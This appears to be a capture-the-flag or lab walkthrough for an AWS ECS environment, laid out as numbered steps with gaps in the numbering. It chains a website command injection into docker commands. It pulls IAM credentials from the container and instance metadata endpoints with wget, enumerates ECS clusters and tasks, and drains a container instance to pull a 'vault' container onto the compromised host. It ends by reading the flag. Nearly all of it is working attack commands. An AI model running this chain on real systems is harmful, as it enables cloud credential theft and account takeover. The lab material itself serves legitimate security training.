1. Find the command injection vulnerability in the website.

    ```bash
    ; echo 'hello world'
    ```

3. Using command injection list the container on the host and get the ID for the privd container.

   `; docker ps --format '{{.Names}} -- '`

   The privd docker ID will be the first field in the output from the following command.

   `; docker ps | grep privd`

4. Using command injection get the container credentials from the privd container as well as the host ECS instance.

   `; docker exec <container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'`
   
   `; docker exec <container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/<ecs-agent>'`

5. With the privd credentials list the clusters in the account then enumerate the tasks.

   ```
   aws ecs list-clusters --profile privd
   tasks=$(aws ecs list-tasks --cluster <my-cluster> --profile ecs --query taskArns --out text)
   aws ecs describe-tasks --cluster <my-cluster> --profile ecs --tasks $tasks --query 'tasks[].[taskDefinitionArn, taskArn, containerInstanceArn]' --out text
   ```

6. Set the container instance that is running the vault container to DRANING

    `aws ecs update-container-instances-state --cluster <my-cluster> --container-instances <target-instance> --status DRAINING`

9. Wait for "Vault" container to be rescheduled, this can be checked by running docker via command injection.

    `; docker ps | grep vault`

10. Using the command injection on the website get the flag from the "vault" container.

    ```
    ; docker exec <container id> ls
    ; docker exec <container id> cat FLAG.TXT
    ```
